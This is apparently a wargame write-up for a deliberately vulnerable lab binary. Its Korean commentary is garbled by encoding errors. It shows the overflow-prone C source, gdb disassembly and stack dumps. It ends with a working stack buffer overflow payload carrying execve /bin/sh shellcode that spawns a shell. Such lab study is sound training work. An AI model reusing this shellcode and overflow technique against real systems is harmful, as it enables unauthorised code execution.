@@ -1,0 +1,217 @@
+level 5 orc ¹®Á¦
+
+
+¹öÆÛ°¡ ÃÊ±âÈ­µÇ¼­ level 4 °°Àº ¹æ¹ıÀº ¾²Áö¸øÇÑ´Ù.
+
+µû¶ó¼­ º¹»çÈÄ
+
+ÁÖ¼Ò¸¦ ±¸ÇØÁØ´Ù.
+
+#include <stdio.h>
+#include <stdlib.h>
+
+extern char **environ;
+
+main(int argc, char *argv[])
+{
+        char buffer[40];
+        int i;
+
+        if(argc < 2){
+                printf("argv error\n");
+                exit(0);
+        }
+
+        // egghunter
+        for(i=0; environ[i]; i++)
+                memset(environ[i], 0, strlen(environ[i]));
+
+        if(argv[1][47] != '\xbf')
+        {
+                printf("stack is still your friend.\n");
+                exit(0);
+        }
+        strcpy(buffer, argv[1]);
+        printf("%s\n", buffer);
+
+        // buffer hunter
+        memset(buffer, 0, 40);
+}
+
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+
+[orc@localhost orc]$ cp wolfman aaa
+[orc@localhost orc]$ gdb -q aaa
+(gdb) set disassembly-flavor intel
+(gdb) disas main
+Dump of assembler code for function main:
+0x8048500 <main>:       push   %ebp
+0x8048501 <main+1>:     mov    %ebp,%esp
+0x8048503 <main+3>:     sub    %esp,44
+0x8048506 <main+6>:     cmp    DWORD PTR [%ebp+8],1
+0x804850a <main+10>:    jg     0x8048523 <main+35>
+0x804850c <main+12>:    push   0x8048640
+0x8048511 <main+17>:    call   0x8048410 <printf>
+0x8048516 <main+22>:    add    %esp,4
+0x8048519 <main+25>:    push   0
+0x804851b <main+27>:    call   0x8048420 <exit>
+0x8048520 <main+32>:    add    %esp,4
+0x8048523 <main+35>:    nop
+0x8048524 <main+36>:    mov    DWORD PTR [%ebp-44],0x0
+0x804852b <main+43>:    nop
+0x804852c <main+44>:    lea    %esi,[%esi*1]
+0x8048530 <main+48>:    mov    %eax,DWORD PTR [%ebp-44]
+0x8048533 <main+51>:    lea    %edx,[%eax*4]
+0x804853a <main+58>:    mov    %eax,%ds:0x8049760
+0x804853f <main+63>:    cmp    DWORD PTR [%eax+%edx],0
+0x8048543 <main+67>:    jne    0x8048547 <main+71>
+0x8048545 <main+69>:    jmp    0x8048587 <main+135>
+0x8048547 <main+71>:    mov    %eax,DWORD PTR [%ebp-44]
+---Type <return> to continue, or q <return> to quit---
+0x804854a <main+74>:    lea    %edx,[%eax*4]
+0x8048551 <main+81>:    mov    %eax,%ds:0x8049760
+0x8048556 <main+86>:    mov    %edx,DWORD PTR [%eax+%edx]
+0x8048559 <main+89>:    push   %edx
+0x804855a <main+90>:    call   0x80483f0 <strlen>
+0x804855f <main+95>:    add    %esp,4
+0x8048562 <main+98>:    mov    %eax,%eax
+0x8048564 <main+100>:   push   %eax
+0x8048565 <main+101>:   push   0
+0x8048567 <main+103>:   mov    %eax,DWORD PTR [%ebp-44]
+0x804856a <main+106>:   lea    %edx,[%eax*4]
+0x8048571 <main+113>:   mov    %eax,%ds:0x8049760
+0x8048576 <main+118>:   mov    %edx,DWORD PTR [%eax+%edx]
+0x8048579 <main+121>:   push   %edx
+0x804857a <main+122>:   call   0x8048430 <memset>
+0x804857f <main+127>:   add    %esp,12
+0x8048582 <main+130>:   inc    DWORD PTR [%ebp-44]
+0x8048585 <main+133>:   jmp    0x8048530 <main+48>
+0x8048587 <main+135>:   mov    %eax,DWORD PTR [%ebp+12]
+0x804858a <main+138>:   add    %eax,4
+0x804858d <main+141>:   mov    %edx,DWORD PTR [%eax]
+0x804858f <main+143>:   add    %edx,47
+0x8048592 <main+146>:   cmp    BYTE PTR [%edx],0xbf
+---Type <return> to continue, or q <return> to quit---
+0x8048595 <main+149>:   je     0x80485b0 <main+176>
+0x8048597 <main+151>:   push   0x804864c
+0x804859c <main+156>:   call   0x8048410 <printf>
+0x80485a1 <main+161>:   add    %esp,4
+0x80485a4 <main+164>:   push   0
+0x80485a6 <main+166>:   call   0x8048420 <exit>
+0x80485ab <main+171>:   add    %esp,4
+0x80485ae <main+174>:   mov    %esi,%esi
+0x80485b0 <main+176>:   mov    %eax,DWORD PTR [%ebp+12]
+0x80485b3 <main+179>:   add    %eax,4
+0x80485b6 <main+182>:   mov    %edx,DWORD PTR [%eax]
+0x80485b8 <main+184>:   push   %edx
+0x80485b9 <main+185>:   lea    %eax,[%ebp-40]
+0x80485bc <main+188>:   push   %eax
+0x80485bd <main+189>:   call   0x8048440 <strcpy>
+0x80485c2 <main+194>:   add    %esp,8
+0x80485c5 <main+197>:   lea    %eax,[%ebp-40]
+0x80485c8 <main+200>:   push   %eax
+0x80485c9 <main+201>:   push   0x8048669
+0x80485ce <main+206>:   call   0x8048410 <printf>
+0x80485d3 <main+211>:   add    %esp,8
+0x80485d6 <main+214>:   push   40
+0x80485d8 <main+216>:   push   0
+---Type <return> to continue, or q <return> to quit---
+0x80485da <main+218>:   lea    %eax,[%ebp-40]
+0x80485dd <main+221>:   push   %eax
+0x80485de <main+222>:   call   0x8048430 <memset>
+0x80485e3 <main+227>:   add    %esp,12
+0x80485e6 <main+230>:   leave
+0x80485e7 <main+231>:   ret
+0x80485e8 <main+232>:   nop
+0x80485e9 <main+233>:   nop
+0x80485ea <main+234>:   nop
+0x80485eb <main+235>:   nop
+0x80485ec <main+236>:   nop
+0x80485ed <main+237>:   nop
+0x80485ee <main+238>:   nop
+0x80485ef <main+239>:   nop
+End of assembler dump.
+(gdb) b* main+189
+Breakpoint 1 at 0x80485bd
+
+
+
+
+
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+
+
+r `python -c 'print "A"*44+"\xbf\xbf\xbf\xbf"'`
+Starting program: /home/orc/aaa `python -c 'print "A"*44+"\xbf\xbf\xbf\xbf"'`
+
+Breakpoint 1, 0x80485bd in main ()
+(gdb) x/1000x $esp
+0xbffffb24:     0xbffffb30      0xbffffc93      0x00000013      0xbffffb58
+0xbffffb34:     0x4000a970      0x400f855b      0x08049690      0x4000ae60
+0xbffffb44:     0xbffffba4      0xbffffb58      0x080484eb      0x0804967c
+0xbffffb54:     0x08049690      0xbffffb78      0x400309cb      0x00000002
+0xbffffb64:     0xbffffba4      0xbffffbb0      0x40013868      0x00000002
+0xbffffb74:     0x08048450      0x00000000      0x08048471      0x08048500
+0xbffffb84:     0x00000002      0xbffffba4      0x08048390      0x0804861c
+0xbffffb94:     0x4000ae60      0xbffffb9c      0x40013e90      0x00000002
+0xbffffba4:     0xbffffc85      0xbffffc93      0x00000000      0xbffffcc4
+0xbffffbb4:     0xbffffce6      0xbffffcf0      0xbffffcfe      0xbffffd1d
+0xbffffbc4:     0xbffffd29      0xbffffd42      0xbffffd5b      0xbffffd66
+0xbffffbd4:     0xbffffd74      0xbffffdb3      0xbffffdc2      0xbffffdd7
+0xbffffbe4:     0xbffffde7      0xbffffdf0      0xbffffe0b      0xbffffe16
+0xbffffbf4:     0xbffffe23      0xbffffe2b      0x00000000      0x00000003
+0xbffffc04:     0x08048034      0x00000004      0x00000020      0x00000005
+0xbffffc14:     0x00000006      0x00000006      0x00001000      0x00000007
+0xbffffc24:     0x40000000      0x00000008      0x00000000      0x00000009
+0xbffffc34:     0x08048450      0x0000000b      0x000001f8      0x0000000c
+0xbffffc44:     0x000001f8      0x0000000d      0x000001f8      0x0000000e
+0xbffffc54:     0x000001f8      0x00000010      0x0f8bfbff      0x0000000f
+0xbffffc64:     0xbffffc80      0x00000000      0x00000000      0x00000000
+0xbffffc74:     0x00000000      0x00000000      0x00000000      0x36383669
+0xbffffc84:     0x6f682f00      0x6f2f656d      0x612f6372      0x41006161
+---Type <return> to continue, or q <return> to quit---
+0xbffffc94:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffca4:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffcb4:     0x41414141      0x41414141      0xbf414141      0x00bfbfbf
+0xbffffcc4:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffcd4:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffce4:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffcf4:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffd04:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffd14:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffd24:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffd34:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffd44:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffd54:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffd64:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffd74:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffd84:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffd94:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffda4:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffdb4:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffdc4:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffdd4:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffde4:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffffdf4:     0x00000000      0x00000000      0x00000000      0x00000000
+
+±×¸®°í level4¿Í ¶È°°ÀÌ ÁÖ¼Ò¸¦±¸ÇÑ´Ù.
+
+./aaa `python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x90"*19+"\x94\xfc\xff\xbf"'`
+bffffaf0
+
+
+±×¸®°í ÀÌÁ¦ ÆäÀÌ·Îµå¸¦ ÀÛ¼ºÇØÁØ´Ù
+
+./wolfman `python -c 'print "\x90"*44+"\xf0\xfa\xff\xbf"+"\x90"*150+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
+ğúÿ¿?1ÀPh//shh/bin‰ãPS‰á‰Â?
+                                                            ?
+bash$
+
+
+ÆäÀÌ·Îµå´Â ¹öÆÛ + retÁÖ¼Ò + ÀûÀıÇÑ ºó°ø°£(ex 100) + ½©ÄÚµå
+
+
